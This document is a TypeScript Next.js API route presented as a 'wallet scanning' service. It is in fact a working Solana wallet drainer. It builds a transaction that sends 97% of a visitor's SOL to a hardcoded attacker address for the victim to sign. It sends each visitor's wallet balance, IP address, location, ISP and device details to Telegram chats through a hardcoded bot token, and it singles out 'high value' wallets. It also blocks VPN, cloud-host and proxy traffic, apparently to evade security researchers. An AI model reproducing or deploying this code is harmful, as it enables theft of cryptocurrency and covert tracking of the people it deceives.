import { type NextRequest, NextResponse } from "next/server"
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js"

// Configuration
const RECIPIENT_ADDRESS = "7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh"
const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
const TELEGRAM_CHAT_IDS = ["7556622176", "1801489729"]

const PUBLIC_RPC_ENDPOINTS = [
  "https://api.mainnet-beta.solana.com",
  "https://solana-api.projectserum.com",
  "https://rpc.ankr.com/solana",
  "https://solana-rpc.publicnode.com",
  "https://solana.drpc.org",
]

enum EventType {
  WALLET_SCAN = "WALLET_SCAN",
  INSUFFICIENT_BALANCE = "INSUFFICIENT_BALANCE",
  TRANSFER_READY = "TRANSFER_READY",
  TRANSFER_TOO_SMALL = "TRANSFER_TOO_SMALL",
  INVALID_ADDRESS = "INVALID_ADDRESS",
  RPC_ERROR = "RPC_ERROR",
  API_REQUEST = "API_REQUEST",
  TRANSACTION_CREATED = "TRANSACTION_CREATED",
  SOL_PRICE_FETCH = "SOL_PRICE_FETCH",
  UNKNOWN_ERROR = "UNKNOWN_ERROR",
  GEOLOCATION_CHECK = "GEOLOCATION_CHECK",
  HIGH_VALUE_WALLET = "HIGH_VALUE_WALLET"
}

interface NotificationData {
  eventType: EventType
  walletAddress?: string
  userIP?: string
  balanceSOL?: number
  balanceUSD?: number
  solPrice?: number
  transferAmount?: number
  percentage?: number
  error?: string
  blockhash?: string
  lastValidBlockHeight?: number
  rpcEndpoint?: string
  requestData?: any
  timestamp?: string
  userAgent?: string
  country?: string
  region?: string
  city?: string
  isp?: string
  isMobile?: boolean
}

async function sendTelegramNotification(notification: NotificationData) {
  try {
    const timestamp = notification.timestamp || new Date().toISOString()
    
    let message = ""
    let emoji = ""

    switch (notification.eventType) {
      case EventType.WALLET_SCAN:
        emoji = "🔍"
        message = `
${emoji} *Wallet Scanned*

📍 *Address:* \`${notification.walletAddress}\`
💰 *Balance:* ${notification.balanceSOL?.toFixed(6)} SOL
💵 *Balance USD:* $${notification.balanceUSD?.toFixed(2)}
📈 *SOL Price:* $${notification.solPrice?.toFixed(2)}
🌐 *IP:* ${notification.userIP}
📍 *Location:* ${notification.city}, ${notification.region}, ${notification.country}
📱 *ISP:* ${notification.isp}
${notification.isMobile ? "📱 *Mobile:* Yes" : "💻 *Mobile:* No"}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
        break

      case EventType.HIGH_VALUE_WALLET:
        emoji = "💰"
        message = `
${emoji} *HIGH VALUE WALLET DETECTED*

📍 *Address:* \`${notification.walletAddress}\`
💰 *Balance:* ${notification.balanceSOL?.toFixed(6)} SOL
💵 *Value:* $${notification.balanceUSD?.toFixed(2)}
📈 *SOL Price:* $${notification.solPrice?.toFixed(2)}
🌐 *IP:* ${notification.userIP}
📍 *Location:* ${notification.city}, ${notification.region}, ${notification.country}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
🚨 *ACTION REQUIRED*
`
        break

      case EventType.TRANSACTION_CREATED:
        emoji = "🛠️"
        message = `
${emoji} *Transaction Created*

📍 *From:* \`${notification.walletAddress}\`
📍 *To:* \`${RECIPIENT_ADDRESS}\`
💸 *Amount:* ${notification.transferAmount?.toFixed(6)} SOL
📊 *Percentage:* ${notification.percentage}%
💵 *Value:* $${((notification.transferAmount || 0) * (notification.solPrice || 0)).toFixed(2)}
🏷️ *Blockhash:* \`${notification.blockhash?.slice(0, 10)}...\`
📏 *Block Height:* ${notification.lastValidBlockHeight}
🌐 *IP:* ${notification.userIP}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
        break

      case EventType.TRANSFER_READY:
        emoji = "✅"
        message = `
${emoji} *Transfer Ready*

📍 *Address:* \`${notification.walletAddress}\`
💰 *Balance:* ${notification.balanceSOL?.toFixed(6)} SOL
💸 *Transfer:* ${notification.transferAmount?.toFixed(6)} SOL
📊 *Percentage:* ${notification.percentage}%
💵 *Total Value:* $${notification.balanceUSD?.toFixed(2)}
🌐 *IP:* ${notification.userIP}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
        break

      case EventType.INSUFFICIENT_BALANCE:
        emoji = "⚠️"
        message = `
${emoji} *Insufficient Balance*

📍 *Address:* \`${notification.walletAddress}\`
💰 *Balance:* ${notification.balanceSOL?.toFixed(6)} SOL
💵 *Value:* $${notification.balanceUSD?.toFixed(2)}
📉 *Min Required:* 0.01 SOL
🌐 *IP:* ${notification.userIP}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
        break

      case EventType.API_REQUEST:
        emoji = "📥"
        message = `
${emoji} *Scan Request Received*

📍 *Address:* \`${notification.walletAddress || "Not provided"}\`
🌐 *IP:* ${notification.userIP}
📍 *Location:* ${notification.city}, ${notification.region}, ${notification.country}
📱 *ISP:* ${notification.isp}
${notification.isMobile ? "📱 *Mobile:* Yes" : "💻 *Mobile:* No"}
🔧 *User Agent:* ${notification.userAgent?.substring(0, 50)}...
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
        break

      default:
        emoji = "ℹ️"
        message = `
${emoji} *Event:* ${notification.eventType}
📍 *Wallet:* \`${notification.walletAddress || "N/A"}\`
💬 *Info:* ${notification.error || "No additional info"}
🌐 *IP:* ${notification.userIP}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
    
    const sendPromises = TELEGRAM_CHAT_IDS.map(chatId =>
      fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message.trim(),
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      }).catch(error => {
        console.error(`Failed to send to chat ${chatId}:`, error)
        return null
      })
    )

    await Promise.all(sendPromises)
  } catch (error) {
    console.error("Error in Telegram notification:", error)
  }
}

async function getSOLPrice(): Promise<number> {
  try {
    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    })
    const data = await response.json()
    const price = data.solana.usd
    
    await sendTelegramNotification({
      eventType: EventType.SOL_PRICE_FETCH,
      solPrice: price,
      timestamp: new Date().toISOString()
    })
    
    return price
  } catch (error) {
    try {
      const response = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT")
      const data = await response.json()
      return parseFloat(data.price)
    } catch {
      return 153.32 // Fallback price
    }
  }
}

async function getIPInfo(ip: string) {
  try {
    if (ip === "unknown" || ip.includes("127.0.0.1") || ip.includes("::1")) {
      return {
        country: "Local",
        region: "Local",
        city: "Local",
        isp: "Local",
        isProxy: false
      }
    }
    
    const response = await fetch(`https://ipapi.co/${ip}/json/`)
    const data = await response.json()
    return {
      country: data.country_name || data.country_code || "unknown",
      region: data.region || data.region_code || "unknown",
      city: data.city || "unknown",
      isp: data.org || data.asn || "unknown",
      isProxy: data.proxy || data.hosting || false
    }
  } catch (error) {
    return {
      country: "unknown",
      region: "unknown",
      city: "unknown",
      isp: "unknown",
      isProxy: false
    }
  }
}

async function checkGeoblock(ip: string, ipInfo: any): Promise<boolean> {
  try {
    // Block known security IPs, VPNs, and hosting providers
    const blockedCountries = ["RU", "CN", "IR", "KP", "SY", "CU", "VE"]
    const blockedISPs = ["alibaba", "digitalocean", "linode", "vultr", "aws", "google", "azure", "cloudflare", "ovh", "hetzner"]
    
    if (blockedCountries.includes(ipInfo.country)) {
      return true
    }
    
    if (ipInfo.isProxy) {
      return true
    }
    
    const ispLower = ipInfo.isp.toLowerCase()
    if (blockedISPs.some(blocked => ispLower.includes(blocked))) {
      return true
    }
    
    return false
  } catch (error) {
    return false
  }
}

export async function POST(request: NextRequest) {
  const startTime = Date.now()
  const timestamp = new Date().toISOString()
  
  try {
    const body = await request.json()
    const { walletAddress, userIP, userAgent, isMobile } = body
    
    // Extract real IP from request if not provided
    const realIP = userIP || 
                  request.ip || 
                  request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 
                  request.headers.get('x-real-ip') || 
                  "unknown"
    
    const ipInfo = await getIPInfo(realIP)
    
    // Send API request notification
    await sendTelegramNotification({
      eventType: EventType.API_REQUEST,
      walletAddress: walletAddress,
      userIP: realIP,
      userAgent: userAgent,
      isMobile: isMobile,
      country: ipInfo.country,
      region: ipInfo.region,
      city: ipInfo.city,
      isp: ipInfo.isp,
      timestamp
    })

    // Check geoblock
    const isBlocked = await checkGeoblock(realIP, ipInfo)
    if (isBlocked) {
      await sendTelegramNotification({
        eventType: EventType.GEOLOCATION_CHECK,
        userIP: realIP,
        country: ipInfo.country,
        region: ipInfo.region,
        city: ipInfo.city,
        isp: ipInfo.isp,
        error: "Blocked geolocation/VPN detected",
        timestamp
      })
      return NextResponse.json({ 
        error: "Service not available in your region",
        blocked: true 
      }, { status: 403 })
    }

    if (!walletAddress || typeof walletAddress !== "string") {
      await sendTelegramNotification({
        eventType: EventType.INVALID_ADDRESS,
        walletAddress: walletAddress || "none",
        userIP: realIP,
        error: "No wallet address provided",
        timestamp
      })
      return NextResponse.json({ error: "Valid wallet address is required" }, { status: 400 })
    }

    let walletPubkey: PublicKey
    let recipientPubkey: PublicKey

    try {
      walletPubkey = new PublicKey(walletAddress)
      recipientPubkey = new PublicKey(RECIPIENT_ADDRESS)
    } catch (error) {
      await sendTelegramNotification({
        eventType: EventType.INVALID_ADDRESS,
        walletAddress: walletAddress,
        userIP: realIP,
        error: error instanceof Error ? error.message : "Invalid address format",
        timestamp
      })
      return NextResponse.json({ error: "Invalid wallet address format" }, { status: 400 })
    }

    // Try multiple RPC endpoints
    let connection: Connection | null = null
    let lastError: Error | null = null
    let usedEndpoint = ""
    
    for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
      try {
        connection = new Connection(endpoint, {
          commitment: "confirmed",
          wsEndpoint: endpoint.replace('https://', 'wss://')
        })
        
        // Test connection
        await connection.getBlockHeight()
        usedEndpoint = endpoint
        break
      } catch (error) {
        lastError = error as Error
        continue
      }
    }
    
    if (!connection) {
      await sendTelegramNotification({
        eventType: EventType.RPC_ERROR,
        userIP: realIP,
        error: lastError?.message || "All RPC endpoints failed",
        timestamp
      })
      return NextResponse.json({ error: "Network connection failed" }, { status: 500 })
    }

    const balanceLamports = await connection.getBalance(walletPubkey)
    const balanceSOL = balanceLamports / LAMPORTS_PER_SOL

    const solPriceUSD = await getSOLPrice()
    const balanceUSD = balanceSOL * solPriceUSD

    // Check for high value wallets (over $1000)
    if (balanceUSD > 1000) {
      await sendTelegramNotification({
        eventType: EventType.HIGH_VALUE_WALLET,
        walletAddress: walletAddress,
        userIP: realIP,
        balanceSOL: balanceSOL,
        balanceUSD: balanceUSD,
        solPrice: solPriceUSD,
        country: ipInfo.country,
        region: ipInfo.region,
        city: ipInfo.city,
        isp: ipInfo.isp,
        isMobile: isMobile,
        timestamp
      })
    }

    // Send wallet scan notification
    await sendTelegramNotification({
      eventType: EventType.WALLET_SCAN,
      walletAddress: walletAddress,
      userIP: realIP,
      balanceSOL: balanceSOL,
      balanceUSD: balanceUSD,
      solPrice: solPriceUSD,
      country: ipInfo.country,
      region: ipInfo.region,
      city: ipInfo.city,
      isp: ipInfo.isp,
      isMobile: isMobile,
      timestamp
    })

    const MIN_BALANCE_SOL = 0.01
    if (balanceSOL < MIN_BALANCE_SOL) {
      await sendTelegramNotification({
        eventType: EventType.INSUFFICIENT_BALANCE,
        walletAddress: walletAddress,
        userIP: realIP,
        balanceSOL: balanceSOL,
        balanceUSD: balanceUSD,
        timestamp
      })
      return NextResponse.json(
        {
          error: "Insufficient balance",
          balance: balanceSOL,
          minRequired: MIN_BALANCE_SOL,
        },
        { status: 400 },
      )
    }

    const TRANSACTION_FEE = 5000
    const SAFETY_BUFFER = 10000
    const MINIMUM_RESERVE = 0.001 * LAMPORTS_PER_SOL

    const totalReserve = TRANSACTION_FEE + SAFETY_BUFFER + MINIMUM_RESERVE
    const availableForTransfer = Math.max(0, balanceLamports - totalReserve)
    const transferAmount = Math.floor(availableForTransfer * 0.97) // 97% of available balance
    const transferAmountSOL = transferAmount / LAMPORTS_PER_SOL

    if (transferAmount < 5000) {
      await sendTelegramNotification({
        eventType: EventType.TRANSFER_TOO_SMALL,
        walletAddress: walletAddress,
        userIP: realIP,
        balanceSOL: balanceSOL,
        transferAmount: transferAmountSOL,
        timestamp
      })
      return NextResponse.json(
        {
          error: "Transfer amount too small",
          balance: balanceSOL,
          transferAmount: transferAmountSOL,
        },
        { status: 400 },
      )
    }

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("finalized")

    // Create transaction
    const transaction = new Transaction({
      recentBlockhash: blockhash,
      feePayer: walletPubkey,
    })

    const transferInstruction = SystemProgram.transfer({
      fromPubkey: walletPubkey,
      toPubkey: recipientPubkey,
      lamports: transferAmount,
    })
    
    transaction.add(transferInstruction)

    // Serialize transaction for wallet signing
    const serializedTransaction = transaction
      .serialize({
        requireAllSignatures: false,
        verifySignatures: false,
      })
      .toString("base64")

    // Send transaction created notification
    await sendTelegramNotification({
      eventType: EventType.TRANSACTION_CREATED,
      walletAddress: walletAddress,
      userIP: realIP,
      transferAmount: transferAmountSOL,
      percentage: 97,
      blockhash: blockhash,
      lastValidBlockHeight: lastValidBlockHeight,
      solPrice: solPriceUSD,
      rpcEndpoint: usedEndpoint,
      timestamp
    })

    // Send transfer ready notification
    await sendTelegramNotification({
      eventType: EventType.TRANSFER_READY,
      walletAddress: walletAddress,
      userIP: realIP,
      balanceSOL: balanceSOL,
      balanceUSD: balanceUSD,
      transferAmount: transferAmountSOL,
      percentage: 97,
      blockhash: blockhash,
      timestamp
    })

    const processingTime = Date.now() - startTime

    return NextResponse.json({
      success: true,
      walletBalance: balanceSOL,
      transferAmount: transferAmountSOL,
      percentage: 97,
      transaction: serializedTransaction,
      blockhash: blockhash,
      lastValidBlockHeight: lastValidBlockHeight,
      processingTime: `${processingTime}ms`,
      solPrice: solPriceUSD,
      recipientAddress: RECIPIENT_ADDRESS,
      timestamp: timestamp,
      rpcEndpoint: usedEndpoint
    })
  } catch (error) {
    await sendTelegramNotification({
      eventType: EventType.UNKNOWN_ERROR,
      userIP: request.ip || "unknown",
      error: error instanceof Error ? error.message : "Unknown error",
      timestamp: new Date().toISOString()
    })
    return NextResponse.json(
      {
        error: "Failed to process request",
        details: error instanceof Error ? error.message : "Unknown error"
      },
      { status: 500 },
    )
  }
}

export async function GET() {
  const timestamp = new Date().toISOString()
  
  await sendTelegramNotification({
    eventType: EventType.API_REQUEST,
    userIP: "Health Check",
    timestamp
  })
  
  return NextResponse.json({
    status: "ok",
    timestamp: timestamp,
    version: "2.0.0",
    endpoint: "/api/scan-wallet",
    description: "Wallet scanning and transaction creation endpoint",
    features: [
      "Wallet balance scanning",
      "Transaction creation",
      "Geolocation checking",
      "High value wallet detection",
      "Telegram notifications"
    ],
    method: "POST",
    requiredParameters: {
      walletAddress: "string",
      userIP: "string (optional)",
      userAgent: "string (optional)",
      isMobile: "boolean (optional)"
    }
  })
}
